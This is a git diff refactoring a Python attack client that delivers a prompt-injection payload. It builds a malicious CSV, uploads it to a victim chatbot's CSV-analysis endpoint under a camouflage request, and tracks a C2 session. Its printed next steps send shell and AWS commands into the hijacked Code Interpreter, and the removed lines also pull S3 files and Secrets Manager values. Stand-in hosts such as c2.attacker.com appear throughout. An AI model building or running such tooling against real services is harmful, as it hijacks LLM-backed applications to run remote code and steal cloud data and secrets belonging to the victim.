@@ -1,33 +1,13 @@
-#!/usr/bin/env python3
-"""
-Attack Client for Prompt Injection via Victim Chatbot
+"""HTTP client for sending prompt injection attacks to victim chatbot."""
 
-This tool automates the attack process:
-1. Generates a malicious CSV with embedded payload
-2. Sends it to the victim's publicly-accessible chatbot API
-3. Returns the session ID for C2 interaction
-
-The attack demonstrates that an attacker needs NO AWS credentials -
-only access to the victim's public API endpoint.
-
-Usage:
-    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com
-"""
-
-import argparse
 import os
-import sys
-import time
 import tempfile
-from pathlib import Path
+from typing import Optional
 
 import requests
 
-# Add src directory to path
-SCRIPT_DIR = Path(__file__).parent.absolute()
-sys.path.insert(0, str(SCRIPT_DIR))
-
-from csv_payload_generator import generate_malicious_csv, generate_session_id
+from .config import get_config
+from .payload_generator import generate_malicious_csv, generate_session_id
 
 
 class AttackClient:
@@ -40,17 +20,23 @@ class AttackClient:
     3. Track session for C2 interaction
     """
 
-    def __init__(self, target_url: str, c2_domain: str, verbose: bool = False):
+    def __init__(
+        self,
+        target_url: str,
+        c2_domain: str = None,
+        verbose: bool = False,
+    ):
         """
         Initialize the attack client.
 
         Args:
             target_url: Victim chatbot URL (e.g., https://chatbot.victim.com)
-            c2_domain: C2 server domain (e.g., c2.attacker.com)
+            c2_domain: C2 server domain (from config if not specified)
             verbose: Enable verbose output
         """
-        self.target_url = target_url.rstrip('/')
-        self.c2_domain = c2_domain
+        config = get_config()
+        self.target_url = target_url.rstrip("/")
+        self.c2_domain = c2_domain or config.domain
         self.verbose = verbose
         self.session_id = None
 
@@ -61,7 +47,7 @@ class AttackClient:
             "success": "[+]",
             "error": "[-]",
             "warning": "[!]",
-            "debug": "[D]"
+            "debug": "[D]",
         }
         prefix = prefixes.get(level, "[*]")
 
@@ -81,18 +67,17 @@ class AttackClient:
             Path to generated CSV file
         """
         if output_path is None:
-            # Create temp file
-            fd, output_path = tempfile.mkstemp(suffix='.csv', prefix='attack_')
+            fd, output_path = tempfile.mkstemp(suffix=".csv", prefix="attack_")
             os.close(fd)
 
         self.session_id = generate_session_id()
 
-        info = generate_malicious_csv(
+        generate_malicious_csv(
             c2_domain=self.c2_domain,
             session_id=self.session_id,
             output_path=output_path,
             injection_row=3,
-            injection_style="technical"
+            injection_style="technical",
         )
 
         self.log(f"Generated payload: {output_path}", "success")
@@ -104,7 +89,7 @@ class AttackClient:
         self,
         csv_path: str,
         message: str = "Please analyze the revenue by customer and show me the top performers",
-        timeout: int = 120
+        timeout: int = 120,
     ) -> dict:
         """
         Send malicious CSV to victim's analyze endpoint.
@@ -120,33 +105,27 @@ class AttackClient:
         url = f"{self.target_url}/analyze/csv"
 
         self.log(f"Target URL: {url}", "info")
-        self.log(f"Sending attack...", "info")
+        self.log("Sending attack...", "info")
 
         try:
-            with open(csv_path, 'rb') as f:
-                files = {
-                    'file': ('customer_analysis.csv', f, 'text/csv')
-                }
-                data = {
-                    'message': message
-                }
+            with open(csv_path, "rb") as f:
+                files = {"file": ("customer_analysis.csv", f, "text/csv")}
+                data = {"message": message}
 
-                response = requests.post(
-                    url,
-                    files=files,
-                    data=data,
-                    timeout=timeout
-                )
+                response = requests.post(url, files=files, data=data, timeout=timeout)
 
             if response.status_code == 200:
                 result = response.json()
                 self.log("Attack sent successfully!", "success")
-                self.log(f"Response preview: {str(result.get('response', ''))[:200]}...", "debug")
+                self.log(
+                    f"Response preview: {str(result.get('response', ''))[:200]}...",
+                    "debug",
+                )
 
                 return {
                     "status": "success",
                     "session_id": self.session_id,
-                    "response": result
+                    "response": result,
                 }
 
             else:
@@ -155,16 +134,15 @@ class AttackClient:
                     "status": "error",
                     "session_id": self.session_id,
                     "error": f"HTTP {response.status_code}",
-                    "detail": response.text[:500]
+                    "detail": response.text[:500],
                 }
 
         except requests.exceptions.Timeout:
-            # Timeout is often expected - payload may be executing
             self.log("Request timed out (payload may be executing)", "warning")
             return {
                 "status": "timeout",
                 "session_id": self.session_id,
-                "message": "Request timed out - payload execution likely in progress"
+                "message": "Request timed out - payload execution likely in progress",
             }
 
         except requests.exceptions.ConnectionError as e:
@@ -172,7 +150,7 @@ class AttackClient:
             return {
                 "status": "connection_error",
                 "session_id": self.session_id,
-                "error": str(e)
+                "error": str(e),
             }
 
         except Exception as e:
@@ -180,12 +158,15 @@ class AttackClient:
             return {
                 "status": "error",
                 "session_id": self.session_id,
-                "error": str(e)
+                "error": str(e),
             }
 
     def run_full_attack(self, message: str = None) -> str:
         """
         Execute full attack workflow.
+
+        Args:
+            message: Optional custom analysis message
 
         Returns:
             Session ID for C2 interaction
@@ -222,9 +203,9 @@ class AttackClient:
         print("-" * 70)
 
         if result["status"] == "success":
-            print(f"\n  [SUCCESS] Attack delivered successfully!")
+            print("\n  [SUCCESS] Attack delivered successfully!")
         elif result["status"] == "timeout":
-            print(f"\n  [LIKELY SUCCESS] Request timed out - payload probably executing")
+            print("\n  [LIKELY SUCCESS] Request timed out - payload probably executing")
         else:
             print(f"\n  [ISSUE] {result.get('error', 'Unknown error')}")
 
@@ -240,95 +221,26 @@ class AttackClient:
         print("=" * 70)
         print("  NEXT STEPS")
         print("=" * 70)
-        print(f"""
+        print(
+            f"""
   The payload should now be running in the victim's Code Interpreter.
-  Use the operator shell to interact with the compromised session:
+  Use the C2 CLI to interact with the compromised session:
 
-  1. Start operator shell:
-     make operator
+  1. Send a command:
+     c2 send "whoami" -s {self.session_id}
 
-  2. Set active session:
-     session {self.session_id}
+  2. Get output:
+     c2 receive -s {self.session_id}
 
-  3. Send commands:
-     send whoami
-     send aws sts get-caller-identity
-     send aws s3 ls
-     send aws dynamodb list-tables
-     send aws secretsmanager list-secrets
+  3. Or attach interactively:
+     c2 attach {self.session_id}
 
-  4. Exfiltrate sensitive data:
-     send aws s3 cp s3://BUCKET/sensitive.csv -
-     send aws secretsmanager get-secret-value --secret-id SECRET_ARN
-""")
+  4. Example commands to run:
+     c2 send "aws sts get-caller-identity" -s {self.session_id}
+     c2 send "aws s3 ls" -s {self.session_id}
+     c2 send "aws dynamodb list-tables" -s {self.session_id}
+"""
+        )
         print("=" * 70 + "\n")
 
         return self.session_id
-
-
-def main():
-    parser = argparse.ArgumentParser(
-        description="Send prompt injection attack to victim chatbot",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  Basic attack:
-    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com
-
-  Attack with custom message:
-    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com \\
-        --message "Show me Q4 revenue breakdown"
-
-  Verbose mode:
-    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com -v
-"""
-    )
-
-    parser.add_argument(
-        "--target", "-t",
-        required=True,
-        help="Victim chatbot URL (e.g., https://chatbot.victim.com)"
-    )
-    parser.add_argument(
-        "--c2-domain", "-c",
-        required=True,
-        help="C2 server domain (e.g., c2.attacker.com)"
-    )
-    parser.add_argument(
-        "--message", "-m",
-        default=None,
-        help="Analysis request message (camouflage text)"
-    )
-    parser.add_argument(
-        "--timeout",
-        type=int,
-        default=120,
-        help="Request timeout in seconds (default: 120)"
-    )
-    parser.add_argument(
-        "--verbose", "-v",
-        action="store_true",
-        help="Enable verbose output"
-    )
-    parser.add_argument(
-        "--session-only",
-        action="store_true",
-        help="Only output session ID (for scripting)"
-    )
-
-    args = parser.parse_args()
-
-    client = AttackClient(
-        target_url=args.target,
-        c2_domain=args.c2_domain,
-        verbose=args.verbose
-    )
-
-    session_id = client.run_full_attack(message=args.message)
-
-    if args.session_only:
-        print(session_id)
-
-
-if __name__ == "__main__":
-    main()
